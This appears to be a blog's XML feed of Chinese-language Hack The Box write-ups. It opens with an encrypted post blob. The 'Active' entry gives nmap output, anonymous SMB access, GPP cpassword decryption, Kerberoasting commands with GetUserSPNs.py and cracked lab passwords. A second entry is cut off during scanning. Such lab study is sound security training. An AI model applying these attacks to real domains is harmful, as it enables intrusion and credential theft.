bcc5a2362911c351c1bfe65643c26f37fe98ff5db9350eb078bca7634159642f8f0aded4ea4cbbbe550ce849e30819ae2902eaa38614fe0150a754c4ed2ebe915b9b9313597d72e886f15100c5b24cc14be977bcb8d98694b8b1904012f07346393ea2d45bdf1d2a1a19b4a866f488e2353519cf85b73e8dd4136ec42611f7739237b2c0d4bcb4e4ddb3aa24e12c68f8f711c44f5d7ad19865304bc5a7187035fcfc530320240bffe047dce92f05afda07576372813d8218535ab24869c803b87f337ed9eb2ad9c8359003545641a814959284f7cd43a41e2043dd1523c5c66b18623c9334e4ba6e0ea3a70a07b2b641e33a9b009e4474c066102953c4f2f0326c72dd858561f4b9b43d587ad52923af1dbf311bef04d8745431333ee3a9d0e6f075e797766645e2e884adc22cf183df890ff90130d7e72b9eab03346063ecf225b13ec29e9725711a5ae36c80afb4cde833f001a157e6007f84e6e2e7b30b9b151980f378814089695cccb7955b4edd71387d84c21f3c5b68da61ecad6fa7dd923dd78a606b30baf6c92adc8e884d5728ec78c43bcb90208c4bbe9d8853f7740e1b2c478683cab8df1a56dafec1a5c5ca4adb362582e3b1a156c64bbec70f426a312b7d806a56f43e121b0511b2aa589b41ce5393196556ee859ae9cd3409bde3f15daf09cf4bbacb1f4358da5e284fdb491e1237c1afe8f91a422eb268fd8d1cd595153b8f1d8c9675735762e6ae38d049b614065844829007ad6dfd1c1a87e24fb6402f768c388a5ba299f85daa75c99efc09e250e4479443e65f890443990d1b7e4d2b7773eabda2f15ac16c1fe0b2110172971adebf9456eeccf3b5066647d1216abf5dd1d5a0cc0dd3e1fa772d9dde488aa0078e7d4fce665b8b6278057b9463d31c6e8c7526013f1429c2f272b14811cd9b17ac4d78da7e807ae225f286d98974fd5542031edb655ead4d69f5b89c8ccf11930e238a4e061bd39cb829f3bc49af315e1fe54ab311b01443fa26ca8ecd0a1e8551401e9eceebbb3ffddcb5cddf81d116037ba225df4efa7dd27ff822484de50e79185de50aa692f6549cadb30cbe951aaf45f96f586aa074cceaa2900820eb37d60c10d0c7414b2fadd055f98c6e80201ad2b7607008d8016aaf963f2b9bf530790a27c9baa3454703ffdc5af2afba49cc9f6ef85a680d3a925b37c0dfa66e8d37ffa74555aed42f4ebdf5623e753d37df129268653ded78aae0109ac08979fd0c54d7f85c67b0631ebb11c634320e5f25b52949b9118144c51e7736609893e3f74a7f4de991f0e59170eca734499f0187ddb5972dd23ccb8867b48bfb51dc2220427f536fa6d2cba8b8ac6d6bb063a9517e2ee8ba9f6dac2dae1124ec03b8e8371052c77027f18d558e7b23c0735da6f8bc9f48662a557d3974a16fd25d86c2ba95e8605ac658a5bcd761c3237b3724910329c37b012cef9cc1b397927799f45c4436887eb9ed91b3ce29aa2791f4e7bd3dba3a4d59b0632fe8ecc1b58217a85943446edd1f8ac07ce0b63bc9a028b9dc803fee761dc6e129469c89fe2ab06515293780826820725ded5b64e7ea24b64952a9d70512202a130886ebfc9eebd34f033ccbacaa4f2106ec8f58dda66a77a376efac644f63e4a332279be07a041ac1ff303006dd1f5519f43e0901410745e589fe6f7805323d4c9281eec00028e96bd7a657006fee776af35f48e41cbe87f13783dc912a9c3390020924aee0a9b9160f81ee37f8311cf6320494db737a47b131583c4f1f916748d5f15c56f32b220368387b68bf79fccc6ee6ec3261c6765081e121ea7ba99dbfbe4950869b107982fc5c5953df3b161c13c3f2f8c9d5d152cf345090b3ddc5f4e932c70343b2982ac6986a44343aa1cbf99ec679c880b226b263f6d719c7276fc4352edc4489f2b878c1fc084175387e22871069b331fcd745c8537db4e1c51e910cffc83a9fbaafd7e05f61e4d891019e0e9bee4ec0eedb2e5435ae3047e2183fd5143ff68c70a87c7e2d3c2d629e6ef3d7a7383e3aa937718089997a022a1a4f6432e0df68d4cf452c2c64acf551cccce5ec9b4134865c59d7da221cd4b5f72a081cc2e6f7dfc83352712fd7a8332acf1249de3dc1959b04445601ea7794fa79ee4fa9fdd38cf061f886b42ed39c57ffba9a4ef6f0e2148926a41ac9963b113206297dca8696a05e1faee3783aae453b52bfebf4dae04147a31d2957e7e47f2b185cfc3faeae3f8ce8ccb04e0a417ff07db8e320999e6ebce3f7f47e8e9c60a1d544a6c0e02f8c0cd818fa7081a825eb9bf156c67dcaca62feb186b52e4e8ccbbcc18eb85bf987cb5b0e67408a0676e9375b0fd3fb13759dfaf419c4d96be3f42652c0cb925937681e23ca82286bc9d801a187a75d571e96a7bf76cb4506d9722a809cb30108c7e05893fef43f1bb66d261674eb70ca7574cf01874e5798ee3377fd17ad55f777576a4e410e37fb750c1500ff363690cb53f60943bfb670a964d6e6bb88a2ac059d0f20a6600439948d4ff6912e04460d47bd8c43e8211d38fd0771e96c965cd5418c3e106891692c9fcef20f366f4805ed028ddaf325e73a1db190a85037e09934867c0b3d6b7466d549242c8da029a0cc19289b069920f06c13b9358e9d5cfac6f8fca59ca427e003ab904c2c7b6cca238031d786a39d46be8a0696b0742216a922cfcb4652d203536a6389959efe95413fed77cd544148c7ecb368d591a745646bcb5af6070399ea1ef2ecfca1306106902d1e68d5f7fd54d8596c192848a2d657f32ac6cd667dbc147d426966946ce2b27fed9b267a57a1e6c64681d1ccc5abc1d637dac15aea50bd3f293a62ed6b3343fb6c7f250c1445eadd9f5ea613329bd1ca6a96f86bbf77e90901a80d3b4586ab5bb5a76aec8542eeef96dfea843e388954475b28a37952ca3aa4cf11ac5401d274767c71fc2dd0ab3253238993d64c4cba3797c820de3256e5a4c1d08744edcd3b8e860e4e07f9ff1b8262bf1baf0ecc8d280454a7486dd65571212c8ef16ff2b961e07a3c5ea360a0ec78c137e2d50a1dbbdc206c521efab593cbf2938a55034a18db598b932e83cea875561a9286008d0da5c815063518de83abcb0e218558784a196477310e46031b021ed5ea21fd091c0cc20f5b9e282d59fc3f27a86bcd42255be6385ee1de014a664db3086765b49c9e6301eeb8f4bf13fd33c2fde10d596a28acfa785e036c9ba2ca18f3c2af9a9a29622aafd088ccee5e8e7ca3c4907ccf315441a365ef8317ef11965e8826b2f7f68d9ac3d9bfe6d51cd555c8eec4e482dd6a43859612ab5fffcf803ed5d4914e8491ee0925da27be076a189fb2609a0d00d21101581f45699b2c654fd751115add67d996bd09c015b377d1c1fd5296570a123e6c75603c8f80e5156ba04a316671b6ddf4ba41f01aedebf5affa1a8d5d4152bdfb0a59f17efde2212dae55715b1a990bedb325d49e2b04d9745d1cb7e19e43d3a35f4783fc3243cf73223e3c5c4ca27280e1b5398e061046225ae95bdfe14ba24ee22ac62c59f04c6b3d699d020b14c367f7cf35df0442387fea58603618e63e536e7ca81f4f19e7c00a943a353b57aa5fba0d881c567adc334186b5ad2089ce6fb7424f95aa4ac63747795c6a159495bf42aeacd2b2132b0e95cc503f1550c003b72b2cc0602714168a37b1c869864e91db6127fd1d670ce1786355a35c891b2bc5fab9a8cce7dc2d5cff33acae45d6e610139b41a76e1d36ce8fbcb221a68d086657e022868105c2debdde59094be106cc417672c4aeb1d809132b160519c7c2a462c9abc1a56c7020d1bf72762570526897032da8e265697c9899db473e71ffc43fdc015649a1d87bd2d32b301626c65c1c13b12b7bd57bc86e40cd2ed167743da64f21e85050b964e37699efafa9d645549e070db9c32aeef99410ec05d5c1f72a6152205e1fa903635cedb5e1678e5082beda45e85c277ebd3c161a5778555b1b5b29675d7e7fdafe654bcb7cd62ff4024f7fc5cc0b309f6df4170a786ec65d773b6605ee3d4192a77d7abc502d7472a9c3401e09eca3c1b99cd3422f789852efa2b57abe615d5182024bd067a58fbb4d49a707cd551f4dca70a24a38ae9d1151473d9bc2078fcd54be06a8278c9a86006cb1c554c78203ca66560bff254a2c2e91f0a010ad237320bf0d1d682014950b7a78192bc46f76c59881d0a34c98d7b9783e4158bd3d3e6b293a3c3f7be4d6865612aa9d9a54157d93242cf0bf81c7418762703588182262c1d69cd2e3edb14e914174ab8b54e0a75117db904006f91f000211b0c54cc8d7b517a527a2e8a87bb4f3ce4e182838b6687865c7f27081079294deef5331f3510504fddd119307b94b66b566fd55c4455d7905c39d16f7c73271805162119de2ef52e98cb37d5b5eb5a31897930667ce4a02344c3cee2f2d4f7a3f99392823a8f34500469363aa71b0fab86ee08f3c67b98b77bf7cb1f7f7302e37f75ba432bb33cf489c6ccdf3a741d00e7d00f3e6e35e11f86dd16dd8743aedb43fa905db7e71326de75a798adab9db9c0c57d1c1cf73962c14b82616e851e9efb55dae79825ec519a633aedc64bcc8582d841e9483eb37addf5a158e1ca3d3f7656057aeb2aa14d90903e99c11f111144ab5892c5307ba52ca153093d6c618d7805e95512b74ff722edea941a47465012879086682121abf766f0ffd70f53af786382bd0cfebfe48a616623f300c86e21798298a5a869a3e07afdf37f840a5ddc243ec4d8e9b6be402e02f94fd8e970f4edbf1192c634e84158ad8055fa2c07a84b2733600f9a1e44480cb7ac969b48078834e176b84225406d945f0c6d4e0c8f3a8f5a2d243971b268d386d9c039ff70dda6220c1f79fd49cc5872d38e300551b4ebb9eca67b2fc05730537c8e51a8cd1ad93fd873c90b8add5eae80655b65fbf720822a43d9288efe0d448f50fe23efb6e6fbbb6aed97590a4ca462187f9d70166a5619b11fe6fffac3f3a932b9b38ef86f365f6d9a7a054a043e8548066ffbc80e9aee4a9790bf4e693430891827752f6e124a714e594d9d44c98e3967bbfd6256964de67aba167ead3647a77fdb6f0a0bf0454e2a00b75cb630a8134c45dbce91e900a170923bc8cd73adf4f8ce93349cbd472e6bf279048029b3273b82e81f66a4867115a139379fe36ef2fe6c3e177f4c0c464aa3e62d002c6eb4543d03f229c3a1f3c9e5232aff7159bfb7bbcb938e0ce92c3e67f768d181543c7df44922ded41f730719f659955d5b139498ba9bfd84e2bfe009eaef4113559f437176bd84a3d0c1c735f47587be87fc024b2cdd67648a8b4c2e2e7e73ab797f2bde70de20468bb2fcbf0ede51debac574e74505766bae9465fecaada7e941ac43318d697db962bbe6885fbd593c99ab6ab467f846d35305e1fd21072192051bc28ea9f4528c416ec07be8862ad71d9e1f6f16cd3612d11f2778637c667470ab9cf452bc7afa5d20f85c060500ae9979ffd0362d85e42e1aae6eb80c244d97123ac92195adc91cf7a895cc5fae138d9a9852287c912f74cfe72ef9795730fb8698bfcbaca74ce198eafdecb0c306e9c50faf065e7f9f91c897a59d34a1a90bb56c7ad1e49b3ce37d46b252537cc25a9e4e8cc1f7d5c4f612f8ab9fa5df3597ba7041383152191cfda349043a7c0f13744ae4bca8636f5ce65e7b4193510ad8201e793ff55ba195109b6044e84f3db4cee8798fdd8eea4295b9ab4d04ca1359c73cbe5264d6181ab71ce62f792749139e5f7051e679d99d1a77cd8eee5a5af980de9494e2bd0f4806845dce26aa5103c22aeaa11e70d1f3d7bb36609e492ea7ad4c97a99061f4223f3fb8103a2cb6b8aaa8a9f3b6369b7585667c9ac6c9ae419c8f4de87dac120a84bcbf72c97e49f71af2cc0bd020b32fcd1fd42a91924d583404d7358571bb228fc9aaa7bd400d0162ddff0c10b09baf34771620d65f0047691e6fc0be9b44697177e17dfe3c590cbf46208ef896338d0a26988172060c52f5db8a6046d22c2bf2e4414fb26fbaa8f3eafb8f4cf9e385ff3cbf77cec2e3fa2aec08809421b6fca0e83f49eb06266bd7979e87b1668b982bc9c0f3fa910d502f33171cf097d2ef47243bac0b8feb1e5da6154728e8a0081c2a95000b22599ccc4844da97b217b4be1a580e1c658b7d8838fa2942de77be18fcb65394b4d6c5fe86867b7e75bf800e763c103d1b141b39fbd74e51329582a9768dcb8d3678678e36b65a1ea487656072eb7459e8f7bbdc37fe69bb6d18aa0d1a67ed5e111bcee4fa0bb8607ea1b202d204cc02d2e64162e6e9268a92496817fd8c548a53cbf93c1bf3bb3c79c35cac436ddc5d8082995afffcf39bd1710e359f08a0eaf3c741d069b6d5a8f64e48cf9f5abb793f5d9ef752d82552fed775ef9357501788f131320a75c600703a55ab765d00022bccaf85e716741cf7f16e1a3ba1e3d74085fd55d649363168e1872e52108d39a4ccd4b22a20db6d9f3197dcce73ded0d5d22ba2de3fafd4e984fcc47fc029565a3a2bbb960daec57a2343500923288adaa172c68f8804abf4b6eb2e32225b5f5c178780276aebfac20ef5244ae3da39f20101889b1640aeb6d9c5db757f9c94fa91eb34d7cd54554a7bb9a049a3f72f6e9067f7d605b04c35f0e2212e08affe31b8605ae62d1d856b39091ec42a939f7096d8d7c92ff392a8451737a785f61fd0dd21375fe475410037d80db54aa79061e7396eeb7e7ace99b787253f157bb17b52490ea7882b0f634626d0c6cc6d477dd2d0ae345669936da6b36f72b2cc65a7fe6455dfdf5bc375d87fd811375ec13fff690678cf55d78992dfd35d79a11b34c7e2265e3cca24a2465f8e10d6dcb162e77de3838adf71723b12159f14ec15f78416b6c1b9e07c3bcf830fe6ccd853c78aeb4047a4a82aae5d493aaf9b488cc8eda7460344a079ed6f58dde0380e1e535e3bb77d5c4cc56c6deb5735332c0066e245a506570a7b43bdcc276a474129ed602c85c7a7210dd9589ee9f07f082381cba5b8d8b0c49195eaa2e9cb868d604ab317b4c928fdf4962f73f457c9d373daff55bd00ffc9e7f4ec6d625ddcc921558613aa6ae29c29ca30d39a279dc067b4b58384da384d898efd45a59cfe00c2b505015441ad0290981d0bf129e32beeca7f559dc8b01bfe2097a3c16833c0c33b026d2971cb87d243160a8908ea72afb49ae20600d45fa5285fc61f86b93220dace373f10ffc12ed9eec679d2e0a5171567df8e4c71e36316376ae4dfab1ff9812be839adae94175f893c6dea7add2fcfdf3e5c00b838e07428709ff8891b262dedc2a00985026ab6a5394fdde78e711729ecbb9465d5dd193b95455a0684af237d918eb639cd647a3239e98cbab7dc7ff67619b387f4ae89e52b014c6f5a6d8f3e376b01f3b6b42cf63679386e13b1114db88445c17bfc4022d5b7e4ba89a737119c993d0084e15831f80b3a4d363859cb5ce9fe427f4d10e62e96e2e4e077293bc89eeb8e9836784371353b3cafcfc2deaf14cfd9ac1f92fae6cfb3cc5af2476777058f648a6b076e2f7574dd9ea46483b9baa1c06b1f140423840aa6a4fe2c8759eb0c2b0b8d29aeba003faa4d94aa4be82ecfe1c2ef6b9eecd2f77f506828f63d093fc11b791bd296a3c8c143c520241ad31af7e50d5ae17adca895b2fea4e76a1a8676a5c8abb97184130c5840a7f45695b3937ea5b76a4a0de1762a898c79ec405d63b13034530fb0525ecfb43f3e81a849fa644ee027f584e9972b92b1c9d1bd8c2b19e017aba311885f7b9eae399f08961e69449f0057ae5974edbe98b281f0c2b97b29db3f2a21833c379799653fc6acbceefc176b0384573e5cac8c9b29ca8c6e4648bc3cc82ad766ae6026643711b9d308ad72724c56854a8d98bade7d7437646d5260d2b435ecb556a5d41e86fe5281bc8d8c619ac52fe27983f2360bfdd46efe439a875627b3b7b686430980467e9a9d84bf63905f2b79bac5797d10faa4bd5e1508b29bbd94c37c42836062b323b263aa0d154061e0cd6fa61c01d85e46a8a4a85b76a95ffa5138042cab80b3a23ab23543bae3c79a68f52107e0577838887235d6dccf34bd59d07db4bd410587d6f6d5ca501100fe0da8c4b4f5852232ce326fd9d92f6a3b9b7d983703c61b65e506091917a15821e7091fc0ccbd4741d0d77e0ff25b0cf979c7d56b811e1b58954e8cc2717fc0466b14f25c83e1c136ee1b2a4182be4e0205b4fef5f884f364b5a477c24f347baadf8cdcaab8b034d40e58c93c6af3c5959ab978916ae5811bad2b64ecef3a162165bd5ac414a872d12a0e07e91ab0aefc4ea148a7d1f81103bd63226bc7a159e4a3835d0467cb9641eb835b844af2aa188887ca57de7575663c69f090ac8568a1c6bf85fe387a7778606247cbdb56342196887648f9411969676146f82b03e5aff1c818052840825f4a9c45f5c3a2a773f5f7c8af7a10f6bbc19c0568859d14a968c7eb9388a3567f1e49863462698dd2b47dd4ca0f6ccd572e16caaf015e8553bfda7f552fd4d37abb93fd68edb28e4443ce75f1398e4136118421ee30a5dcef060115dc5186db293c7a4e2ba54c3d723f5ecef589d257b1ad5446ad86efb5bb5ae648e1f9cbb0e18ff8b8adc3510d39b9dbfbce7fdf820f63348a3e167d417467b1a5b82dc911e80a0067bd09e289a1dbcc70756bb73cdc572f4a69c5f4395f526679b167b643314faef210c890b60ca954e6eb8d044f16ff661b0abdba569be6168a12886d5edaff1abff72a86ae5baf325a9063761c55efff3b9bd050cb003c64e2d762825cc8b7bea02fa80a52d4503a7084e5712ff6aaf3b36f256eb24ca07096681350c1e1411be0cc2d51ad30a8571b0a790bef1b7a7f6fc4a00010ba11e3d18ed0999c3a6faa896e694c92f915acb85928bb8e9b9b87295e461b970f74ce35993c9d3a09f7cbdc36b83449a69671617c9fc3c3a751b4b0928855b68b1642f7baed451dd224bd82cf42af74d01ae4cdaeb38c045a524e072a86f39c06eb18a239e38bea3dfdfe48372a835ba1dfa93b8f39350cb80202e2188ad67b3795c45794277ee95aa1b2d48d24a64dace74481569291fbb6cd124422ca486a78aef46bb6b15bd15ece1a26d525f1b46ea0aa20694bb35b47fdf63b385b62fac7cdf709b1842d052d0d01f48f71240653aac67fcf28e1160468db9354cf442e25e85eea6bd3f157d633a8cbdc74ac93d1275632ac45217422e7811777b43fdde69cd7009ed0454e97996dc88d7b4cb7453b2b6942ebffda6ec3faa2a8caa1a86d647075ce1fb62a4b420370ca3a8ae8d83f3ac67489e2301679d672dc768ff2ba16aa6c22e6dd33b793ebce7794974d1b4896b15c2901650b2ab1b71fbd671ae2abde429a025f5c49b9ef49b43a04cf115944d25a36af9b8a962661d29a52c43d139f7c005825841e4cce190854f733a280f0410fd79aa0010ddf9fb172cf1e587747acc21f0b0aec1be2d9695bece3352438cd215c697c179c8abff0c883d17231d4ffd295b31242fb7eaba1c33d3186563e9ebec7c9c80a5246941ee64006393d371aaf64715d74dfaa107b63cdd29375ecbc32518faecb1cf83114cd788329966af0e9910a6605d882309c70cc94b4d14cd909195edd360cf3d652ef5f5ca500cef0c9a9a81d487b9f45c0cf7f73c4152654c26df38b5aea895922e425d5721146ebb9ce66c8a6a813234628a8b98b01b4e2a33ee53b95da8b1574035b3d27620954a6d6cbe8bf90f55139a226c924a66b420dce09f5f3f9caa84a1c66e37f16f1242473f0ae266d927c62297cad875e94944650be54950c37891a80f8a4d3db765e3680a5e87572f55fbdc3e1a82860afcee8e66d8957411c9ec25ed72e4c1b1dbc80eaa347b334744d9f4cfa4f6db78322aee9b4e74305db94514f42db21af3f0549b09efa6bf41091b722653c27c9f6eb3f3f72459d378df783dc53ed4d0c46209cf9aa4370350c3a036ae90528ad1b46a65033a6491a3ded72918ace5f83fa57a803681ff64e7b45d5f37cef51162efad16f4a4e4a7ed1ea137dbd2c445d076abb5638358c5da8065cc41b6007a4fb407b8b6d588cb070c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy W-Active</title>
      <link href="/2025/01/14/12.%20Easy%20W-Active/"/>
      <url>/2025/01/14/12.%20Easy%20W-Active/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><p>是个域控</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE    SERVICE       VERSION25/tcp    open     smtp?|_smtp-commands: Couldn't establish connection on port 2553/tcp    open     domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid: |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 09:30:17Z)110/tcp   open     tcpwrapped135/tcp   open     msrpc         Microsoft Windows RPC139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp   open     microsoft-ds?464/tcp   open     kpasswd5?514/tcp   filtered shell593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp   open     tcpwrapped1151/tcp  filtered unizensus3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp  open     tcpwrapped49152/tcp open     msrpc         Microsoft Windows RPC49153/tcp open     msrpc         Microsoft Windows RPC49154/tcp open     msrpc         Microsoft Windows RPC49155/tcp open     msrpc         Microsoft Windows RPC49157/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.049158/tcp open     msrpc         Microsoft Windows RPC49165/tcp open     msrpc         Microsoft Windows RPC50006/tcp filtered unknownAggressive OS guesses: Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (95%), Microsoft Windows XP SP3 (92%), VMware Player virtual NAT device (92%), Actiontec MI424WR-GEN3I WAP (90%), DD-WRT v24-sp2 (Linux 2.4.37) (90%), Linux 4.4 (88%), Linux 3.2 (87%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsTCP Sequence Prediction: Difficulty=248 (Good luck!)IP ID Sequence Generation: IncrementalService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   2:1:0: |_    Message signing enabled and required| smb2-time: |   date: 2025-01-14T09:32:18|_  start_date: 2025-01-14T04:08:46<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再用enum4linux-ng枚举一波信息：</p><p>根域服务器，域名 active.htb，FQDN DC.active.htb，操作系统可能是Windows 7、Windows Server 2008 R2；同时SMB允许匿名登录：</p><p><img src="/Rxi134_FILE/a9c9c06009636a8e05e4bcfd916f09ed_MD5.jpeg"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><h2 id="SMB匿名登录"><a href="#SMB匿名登录" class="headerlink" title="SMB匿名登录"></a>SMB匿名登录</h2><p><img src="/Rxi134_FILE/b6edaf94e40f378b8a566c280cf4fc2b_MD5.jpeg"></p><p>进去一看有个文件夹<br><img src="/Rxi134_FILE/ce622759720e5afff9bbeda21b3235d2_MD5.jpeg"></p><p>递归下载下来<br><img src="/Rxi134_FILE/bb3d1633372d81890c39a3f78e60d6dd_MD5.jpeg"></p><p>经过搜索是 SYSVOL&#x2F; 文件夹下的内容</p><h2 id="解密SYSVOL组策略文件密码"><a href="#解密SYSVOL组策略文件密码" class="headerlink" title="解密SYSVOL组策略文件密码"></a>解密SYSVOL组策略文件密码</h2><blockquote><p>GPP是Group Policy Preferences（组策略首选项）的缩写，这是一个组策略实施工具。通过该工具，网络管理员可以实现更多的网络管理，如驱动映射、添加计划任务、管理本地组和用户。其中最常用的功能就是远程创建本地账户。在创建过程中，会在目标主机传送一个Groups.xml文件。该文件中保存这创建的用户名和加密的密码。该加密的密码采用对称加密。</p></blockquote><p>在 <code>active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</code>文件下能提取到凭据信息：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">userName="active.htb\SVC_TGS"cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>GPP 的 AES 算法密钥是公开的，解密得到明文<br><img src="/Rxi134_FILE/bb934614fbaa51e93848b29562e6203f_MD5.jpeg"></p><p>现在我们就有了一组域凭据：</p><pre class="line-numbers language-none"><code class="language-none">active.htb\SVC_TGS : GPPstillStandingStrong2k18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="驻足"><a href="#驻足" class="headerlink" title="驻足"></a>驻足</h1><h2 id="尝试winrm（失败）"><a href="#尝试winrm（失败）" class="headerlink" title="尝试winrm（失败）"></a>尝试winrm（失败）</h2><p>如何拿到shell？首先想到 winrm ，但是5985和5986端口是过滤的</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT     STATE    SERVICE5985/tcp filtered wsman5986/tcp filtered wsmans<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="继续枚举SMB"><a href="#继续枚举SMB" class="headerlink" title="继续枚举SMB"></a>继续枚举SMB</h2><p><img src="/Rxi134_FILE/8c4741c2e9c8080c7ad20debed0d2926_MD5.jpeg"><br>能够访问 <code>Users\</code> 文件夹了，但是其它目录都是不可写的，psexec肯定用不了</p><p>没办法了，查看wp，发现 shell 确实拿不到，那没事了</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>连shell都没有，只有一组域凭据🤔，那可用的攻击手法就很少了</p><h2 id="Kerberosasting"><a href="#Kerberosasting" class="headerlink" title="Kerberosasting"></a>Kerberosasting</h2><p>先查询SPN</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python GetUserSPNs.py <span class="token string">'active.htb/SVC_TGS:GPPstillStandingStrong2k18'</span> -dc-ip <span class="token number">10.10</span>.10.100  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/02c246f7fd24736427a17f524e234c15_MD5.jpeg"><br>可以看到administrator用户下注册了对整个域的cifs服务</p><p>那主线就很明确了，申请ST然后破解服务哈希</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python GetUserSPNs.py <span class="token string">'active.htb/SVC_TGS:GPPstillStandingStrong2k18'</span> -dc-ip <span class="token number">10.10</span>.10.100 -request-user Adminisrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/9a6c3381ca543a1522b0aaeb15207a8f_MD5.jpeg"></p><p>3s 不到破解出来<br><img src="/Rxi134_FILE/32e83e1b204814ffab477b7e3ae00681_MD5.jpeg"></p><p>现在便有了域管凭据<code>active.htb\administrator:Ticketmaster1968</code></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy L-UnderPass-S6</title>
      <link href="/2025/01/13/9.%20Easy%20L-UnderPass-S6%E6%8E%92%E4%BD%8D%E8%B5%9B/"/>
      <url>/2025/01/13/9.%20Easy%20L-UnderPass-S6%E6%8E%92%E4%BD%8D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>访问ip，是apache2的默认页面<br><img src="/Rxi134_FILE/2b87e76b5afca44b1a99a18b3db11457_MD5.jpeg"></p><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT    STATE SERVICE    VERSION22/tcp  open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)25/tcp  open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2580/tcp  open  http       Apache httpd 2.4.52 ((Ubuntu))|_http-server-header: Apache/2.4.52 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works| http-methods: |_  Supported Methods: GET POST OPTIONS HEAD110/tcp open  pop3?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">[16:29:27] Starting: [16:29:43] 403 -  276B  - /.ht_wsr.txt                                      [16:29:43] 403 -  276B  - /.htaccess.bak1                                   [16:29:43] 403 -  276B  - /.htaccess.orig                                   [16:29:43] 403 -  276B  - /.htaccess.sample[16:29:43] 403 -  276B  - /.htaccess.save                                   [16:29:43] 403 -  276B  - /.htaccess_extra                                  [16:29:43] 403 -  276B  - /.htaccessBAK[16:29:43] 403 -  276B  - /.htaccess_sc[16:29:43] 403 -  276B  - /.htaccessOLD[16:29:43] 403 -  276B  - /.htaccess_orig[16:29:43] 403 -  276B  - /.htaccessOLD2                                    [16:29:43] 403 -  276B  - /.htm                                             [16:29:43] 403 -  276B  - /.html[16:29:43] 403 -  276B  - /.httr-oauth                                      [16:29:43] 403 -  276B  - /.htpasswd_test[16:29:43] 403 -  276B  - /.htpasswds                                       [16:29:48] 403 -  276B  - /.php                                             [16:31:51] 403 -  276B  - /server-status                                    [16:31:51] 403 -  276B  - /server-status/                                                                                                                Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="打波poc"><a href="#打波poc" class="headerlink" 